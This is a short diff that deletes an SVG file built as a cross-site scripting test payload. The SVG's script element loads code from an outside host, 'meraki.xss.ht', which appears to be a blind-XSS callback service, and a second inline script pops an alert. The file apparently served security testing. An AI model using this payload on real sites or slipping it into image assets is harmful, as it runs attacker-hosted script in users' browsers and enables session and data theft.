@@ -1,9 +1,0 @@
-<svg width="200" height="200" zoomAndPan="disable" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" xml:space="preserve">
-    <!-- Script linked from the outside-->
-    <script xlink:href="https://meraki.xss.ht"/>
-    <script>
-      //<![CDATA[
-        alert("ble");
-      ]]>
-    </script>
-  </svg>
